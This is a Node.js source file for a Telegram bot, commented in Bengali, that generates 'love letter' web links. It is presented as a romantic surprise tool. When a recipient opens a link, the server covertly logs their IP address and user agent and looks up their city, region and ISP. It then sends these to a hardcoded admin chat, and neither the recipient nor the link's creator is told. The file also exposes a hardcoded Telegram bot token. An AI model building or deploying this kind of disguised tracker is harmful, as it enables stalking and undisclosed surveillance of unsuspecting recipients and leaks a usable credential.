const express = require('express');
const path = require('path');
const axios = require('axios');
const { Telegraf } = require('telegraf');

const app = express();
app.use(express.json());

const TELEGRAM_TOKEN = "8922778423:AAGbdZfdUDol_5w3dPbeBH0aucf9qkgtPTA"; 
const SERVER_URL = "https://love-bb7p.onrender.com"; 
const ADMIN_CHAT_ID = "6719885052"; 

const bot = new Telegraf(TELEGRAM_TOKEN);

const linkDatabase = {}; 
const userSessions = {}; 

// 📌 ডেমো ডেটাবেজ সেটআপ
linkDatabase['demo'] = {
    userId: ADMIN_CHAT_ID,
    name: "Developer",
    username: "@admin",
    animations: ["হ্যালো প্রিয়", "কেমন আছো?", "তোমার জন্য একটা সারপ্রাইজ আছে... 👀"],
    letter: "এটি একটি ডেমো লাভ লেটার।\nআপনি যখন আপনার কাস্টম লিঙ্ক তৈরি করবেন, তখন আপনার দেওয়া চিঠিটি ঠিক এই খামের ভেতর এভাবে সুন্দর করে দেখাবে! ❤️",
    isActive: true
};

// 🤖 ১. /start কমান্ড
bot.command('start', (ctx) => {
    ctx.reply(`👋 হ্যালো ${ctx.message.from.first_name}!\n` +
              `রোমান্টিক লাভ লেটার এবং ট্র্যাকিং লিঙ্ক তৈরি করার বতে আপনাকে স্বাগতম। ❤️\n\n` +
              `🚀 নতুন লিঙ্ক তৈরি করতে এখনই টাইপ করুন: /newlink\n` +
              `🔒 যেকোনো একটিভ লিঙ্ক বন্ধ করতে টাইপ করুন: /off [লিঙ্ক_আইডি]\n` +
              `👀 বটটি কেমন কাজ করে ডেমো দেখতে টাইপ করুন: /demo\n` +
              `📊 আপনার তৈরি করা লিঙ্কের রিপোর্ট দেখতে: /stats\n` +
              `📝 আপনার কোনো মতামত বা অভিযোগ জানাতে: /feedback\n` +
              `❓ যেকোনো সাহায্য পেতে টাইপ করুন: /help`);
});

// 🤖 ২. /help কমান্ড
bot.command('help', (ctx) => {
    ctx.reply(`❓ **কীভাবে এই বটটি ব্যবহার করবেন?**\n\n` +
              `১. প্রথমে /newlink কমান্ডটি দিন এবং নির্দেশনা মেনে লিঙ্ক তৈরি করুন।\n` +
              `২. লিঙ্কটি আপনার প্রিয়জনকে পাঠান। সে এটি ওপেন করলেই বা উত্তর দিলেই নোটিফিকেশন পাবেন।\n\n` +
              `🔒 **লিঙ্ক বন্ধ করার নিয়ম:**\n` +
              `আপনার তৈরি করা কোনো লিঙ্ক যদি ডিলিট বা অফ করে দিতে চান, তবে টাইপ করুন: \n\`/off লিঙ্ক_আইডি\`\n` +
              `*(যেমন: লিঙ্ক যদি হয় \`${SERVER_URL}/love/abc123\` তবে লিখবেন: \`/off abc123\`)*\n\n` +
              `❌ লিঙ্ক তৈরি করার সময় মাঝপথে সেশন বাতিল করতে চাইলে /cancel টাইপ করতে পারেন।`);
});

// 🤖 ৩. /stats কমান্ড (লিঙ্ক আইডিসহ রিপোর্ট দেখাবে)
bot.command('stats', (ctx) => {
    const userId = ctx.chat.id;
    let myLinks = [];
    
    Object.keys(linkDatabase).forEach(id => {
        if (linkDatabase[id].userId === userId && id !== 'demo') {
            const status = linkDatabase[id].isActive !== false ? "🟢 চালু" : "🔴 বন্ধ";
            myLinks.push(`🎫 আইডি: \`${id}\` [${status}]`);
        }
    });

    if (myLinks.length === 0) {
        ctx.reply("❌ আপনি এখনও কোনো লাভ লিঙ্ক তৈরি করেননি ভাইয়া। নতুন লিঙ্ক তৈরি করতে /newlink কমান্ডটি ব্যবহার করুন।");
    } else {
        ctx.reply(`📊 **আপনার প্রোফাইল রিপোর্ট:**\n\n` +
                  `👤 নাম: ${ctx.message.from.first_name}\n` +
                  `🎫 আপনার তৈরি করা লিঙ্কগুলো:\n${myLinks.join('\n')}\n\n` +
                  `💡 যেকোনো লিঙ্ক অফ করতে চাইলে টাইপ করুন: \`/off আইডি_নাম\``);
    }
});

// 🤖 ৪. /off কমান্ড - লিঙ্ক ডিঅ্যাক্টিভেট বা বন্ধ করা
bot.command('off', (ctx) => {
    const userId = ctx.chat.id;
    const linkId = ctx.message.text.replace('/off', '').trim();
    
    if (!linkId) {
        return ctx.reply("❌ লিঙ্ক অফ করতে কমান্ডের পাশে লিঙ্ক আইডিটি লিখুন।\n" +
                         "যেমন: আপনার লিঙ্ক আইডি যদি `abc123` হয়, তবে লিখুন: \`/off abc123\`\n\n" +
                         "💡 আপনার তৈরি করা লিঙ্কগুলোর আইডি দেখতে /stats চেক করুন।");
    }

    const linkData = linkDatabase[linkId];

    if (!linkData || linkId === 'demo') {
        return ctx.reply("❌ এই আইডি দিয়ে কোনো ভ্যালিড লিঙ্ক পাওয়া যায়নি!");
    }

    // চেক করা যে এই লিঙ্কটি এই ইউজারেরই কিনা
    if (String(linkData.userId) !== String(userId)) {
        return ctx.reply("❌ দুঃখিত, আপনি অন্য কারও লিঙ্ক বন্ধ করতে পারবেন না!");
    }

    if (linkData.isActive === false) {
        return ctx.reply("⚠️ এই লিঙ্কটি অলরেডি বন্ধ করা আছে ভাইয়া!");
    }

    // লিঙ্ক অফ করে দেওয়া
    linkData.isActive = false;
    ctx.reply(`✅ সফলভাবে আপনার লিঙ্কটি (\`${linkId}\`) বন্ধ করে দেওয়া হয়েছে। এখন ওই লিঙ্কে ঢুকলে "Link Expired" দেখাবে।`);
});

// 🤖 ৫. /demo কমান্ড
bot.command('demo', (ctx) => {
    ctx.reply(`👀 **লাভ লেটার পেজের ডেমো:**\n\n` +
              `নিচের লিঙ্কটি ওপেন করে দেখুন পেজটি কেমন দেখায় এবং কীভাবে কাজ করে:\n` +
              `${SERVER_URL}/love/demo\n\n` +
              `💖 আপনার নিজের পছন্দের টেক্সট দিয়ে এমন লিঙ্ক তৈরি করতে এখনই /newlink ব্যবহার করুন।`);
});

// 🤖 ৬. /cancel কমান্ড
bot.command('cancel', (ctx) => {
    const userId = ctx.chat.id;
    if (userSessions[userId]) {
        delete userSessions[userId];
        ctx.reply("❌ আপনার চলতি সেশনটি সফলভাবে বাতিল করা হয়েছে। নতুন করে শুরু করতে /newlink টাইপ করুন।");
    } else {
        ctx.reply("💡 আপনার কোনো অ্যাক্টিভ সেশন চালু নেই ভাইয়া।");
    }
});

// 🤖 𪚥. /feedback কমান্ড
bot.command('feedback', (ctx) => {
    const userId = ctx.chat.id;
    userSessions[userId] = {
        step: 'AWAITING_FEEDBACK',
        name: `${ctx.message.from.first_name} ${ctx.message.from.last_name || ''}`,
        username: ctx.message.from.username ? '@' + ctx.message.from.username : 'নেই'
    };
    ctx.reply("📝 এই বটের ব্যাপারে আপনার যেকোনো মতামত, পরামর্শ বা বাগ রিপোর্ট এখানে লিখে পাঠান। আপনার মেসেজটি সরাসরি ডেভেলপারের কাছে পৌঁছে যাবে।");
});

// 🤖 ৮. /newlink কমান্ড
bot.command('newlink', (ctx) => {
    const userId = ctx.chat.id;
    userSessions[userId] = {
        step: 'AWAITING_ANIMATION_TEXT',
        name: `${ctx.message.from.first_name} ${ctx.message.from.last_name || ''}`,
        username: ctx.message.from.username ? '@' + ctx.message.from.username : 'নেই'
    };

    ctx.reply("✨ কাস্টম লাভ লিঙ্ক তৈরি সেশন শুরু হয়েছে!\n\n" +
              "👉 প্রথমে শুরুর অ্যানিমেশন টেক্সটগুলো দিন।\n" +
              "⚠️ মনে রাখবেন: প্রতি লাইনের পর একটি করে 'Enter' দিয়ে নতুন লাইনে লিখবেন। যতগুলো ইচ্ছা লাইন দিতে পারেন।\n\n" +
              "💡 যেকোনো মুহূর্তে এই প্রসেসটি বাতিল করতে /cancel টাইপ করুন।");
});

// 🤖 ৯. টেক্সট মেসেজ হ্যান্ডলার
bot.on('text', (ctx) => {
    const userId = ctx.chat.id;
    const session = userSessions[userId];
    const text = ctx.message.text;

    if (!session) return; 

    // ফিডব্যাক প্রসেস
    if (session.step === 'AWAITING_FEEDBACK') {
        const feedbackText = text.trim();
        if (feedbackText.length < 5) {
            return ctx.reply("❌ দয়া করে আপনার মতামতটি একটু বিস্তারিত লিখুন (অন্তত ৫টি অক্ষর)।");
        }

        const feedbackAlert = `📝 **New User Feedback Received!** 📝\n\n` +
                              `👤 **From:** ${session.name} (${session.username})\n` +
                              `🆔 **User ID:** \`${userId}\`\n\n` +
                              `💬 **Message:** ${feedbackText}`;
        
        bot.telegram.sendMessage(ADMIN_CHAT_ID, feedbackAlert, { parse_mode: 'Markdown' }).catch(e => {});
        ctx.reply("✅ আপনার মূল্যবান মতামতটি সফলভাবে আমাদের ডেভেলপারের কাছে পাঠানো হয়েছে। ধন্যবাদ ভাইয়া! 🙏");
        delete userSessions[userId];
        return;
    }

    // নতুন লিঙ্ক তৈরি - ধাপ ১
    if (session.step === 'AWAITING_ANIMATION_TEXT') {
        const lines = text.split('\n').map(line => line.trim()).filter(line => line.length > 0);
        if (lines.length === 0) return ctx.reply("❌ দয়া করে অন্তত ১টি সলিড লাইন লিখুন!");

        session.animations = lines;
        session.step = 'AWAITING_LETTER_TEXT'; 
        ctx.reply(`✅ চমৎকার! আপনি ${lines.length}টি অ্যানিমেশন লাইন যোগ করেছেন।\n\n💌 এবার খামের ভেতরের মূল চিঠি বা মেসেজটি লিখে পাঠান:`);
        return;
    }

    // নতুন লিঙ্ক তৈরি - ধাপ ২ (isActive: true সহ সেভ হবে)
    if (session.step === 'AWAITING_LETTER_TEXT') {
        const uniqueId = Math.random().toString(36).substring(2, 9);
        
        linkDatabase[uniqueId] = {
            userId: userId,
            name: session.name,
            username: session.username,
            animations: session.animations,
            letter: text.trim(),
            isActive: true // নতুন লিঙ্ক ডিফল্টভাবে সচল থাকবে
        };

        const generatedLink = `${SERVER_URL}/love/${uniqueId}`;
        ctx.reply(`💝 অভিনন্দন! আপনার কাস্টমাইজড লিঙ্কটি সম্পূর্ণ রেডি:\n\n${generatedLink}\n\nএটি কপি করে পাঠিয়ে দিন। সে ওপেন করলেই আপনি নোটিফিকেশন পেয়ে যাবেন!`);

        const currentTime = new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"});
        const adminLog = `🚨 **New Customized Link Created!** 🚨\n\n👤 **Creator:** ${session.name} (${session.username})\n🆔 **User ID:** \`${userId}\`\n🎫 **Link ID:** ${uniqueId}\n⏰ **Time:** ${currentTime}`;
        if (String(userId) !== String(ADMIN_CHAT_ID)) {
            bot.telegram.sendMessage(ADMIN_CHAT_ID, adminLog, { parse_mode: 'Markdown' }).catch(e => {});
        }

        delete userSessions[userId];
        return;
    }
});

bot.launch().then(() => console.log("Telegram Bot started.")).catch(err => console.error(err));

app.get('/love/:id', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 📊 ১০. কন্টেন্ট ডেলিভারি এবং একটিভ স্ট্যাটাস চেক
app.post('/api/get-content', async (req, res) => {
    const { id } = req.body;
    const linkData = linkDatabase[id];
    
    if (linkData) {
        // যদি লিঙ্কটি ইউজার অফ করে দেয় (isActive === false)
        if (linkData.isActive === false) {
            return res.json({ success: false, error: "expired" });
        }

        if (id === 'demo') {
            return res.json({ success: true, animations: linkData.animations, letter: linkData.letter });
        }

        let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
        if (ip.includes(',')) ip = ip.split(',')[0].trim();
        const userAgent = req.headers['user-agent'] || 'Unknown Device';
        const openTime = new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"});
        let locationInfo = "Location details unavailable";
        
        try {
            if(ip && !ip.includes('127.0.0.1')) {
                const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
                if(geo.data && geo.data.status === 'success') {
                    locationInfo = `🌍 **Location:** ${geo.data.city}, ${geo.data.regionName}, ${geo.data.country}\n🏢 **ISP:** ${geo.data.isp}`;
                }
            }
        } catch(e) {}

        bot.telegram.sendMessage(linkData.userId, `👀 **Notification:** কেউ একজন এইমাত্র আপনার কাস্টম লিঙ্কটি ওপেন করেছে!\n⏰ **সময়:** ${openTime}`);

        const adminAlert = `👁‍🗨 **Custom Link Opened Alert!** 👁‍🗨\n\n👤 **Creator User:** ${linkData.name} (${linkData.username})\n🎫 **Link ID:** ${id}\n⏰ **Time:** ${openTime}\n\n🌐 **IP:** \`${ip}\`\n${locationInfo}`;
        if (String(linkData.userId) !== String(ADMIN_CHAT_ID)) {
            bot.telegram.sendMessage(ADMIN_CHAT_ID, adminAlert, { parse_mode: 'Markdown' }).catch(e => {});
        }

        return res.json({ success: true, animations: linkData.animations, letter: linkData.letter });
    }
    res.json({ success: false, error: "invalid" });
});

app.post('/api/respond', (req, res) => {
    const { response, id } = req.body;
    const linkData = linkDatabase[id]; 
    
    if (linkData && linkData.isActive !== false) {
        if (id === 'demo') return res.json({ success: true });

        bot.telegram.sendMessage(linkData.userId, `💌 আপনার কাস্টম লিঙ্কে একটি নতুন রেসপন্স এসেছে!\n\nউত্তর: ${response}`);
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

app.get('/ping_test', (req, res) => res.send("Awake!"));
setInterval(() => { axios.get(`${SERVER_URL}/ping_test`).catch(e=>''); }, 270000);

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server live on port ${PORT}`));
